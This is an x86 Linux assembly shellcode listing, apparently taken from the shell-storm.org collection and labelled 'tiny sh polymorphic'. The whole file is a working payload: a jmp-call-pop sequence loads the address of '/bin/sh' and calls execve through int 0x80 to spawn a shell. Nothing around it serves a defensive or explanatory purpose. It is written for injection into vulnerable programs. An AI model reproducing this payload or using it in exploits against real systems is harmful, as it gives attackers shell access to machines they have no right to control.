; tiny sh polymorphic - http://shell-storm.org/shellcode/files/shellcode-841.php
; 20 bytes
; Author: rikih gunawan

global _start

_start:
	jmp short shell_str ; get address of shell

sys_call:
	pop ebx             ; ebx = /bin/sh
	push byte 0xb       ; execve = 11 ~ 0xb
  pop eax
 	int 0x80

shell_str:
	call sys_call
	shell: db '/bin/sh'